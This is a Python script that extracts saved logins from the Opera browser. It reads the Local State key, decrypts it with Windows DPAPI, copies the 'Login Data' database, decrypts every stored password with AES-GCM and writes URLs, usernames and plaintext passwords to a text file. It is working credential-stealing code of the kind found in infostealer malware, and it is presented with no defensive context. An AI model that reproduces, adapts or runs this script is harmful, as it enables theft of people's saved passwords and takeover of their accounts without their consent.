import os
import getpass
import win32crypt
import shutil
import json
import sqlite3
from datetime import datetime, timedelta
from base64 import b64decode
from Crypto.Cipher import DES3, AES

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State") # find the Local State file
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        
    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(e)
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


if __name__ == "__main__":
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
    filename = "OperaData.db"

    file = open("opera_pwd.txt","w")

    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            file.write(f"Origin URL: {origin_url}\n")
            file.write(f"Action URL: {action_url}\n")
            file.write(f"Username: {username}\n")
            file.write(f"Password: {password}\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
        file.write("="*50)

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    file.close()
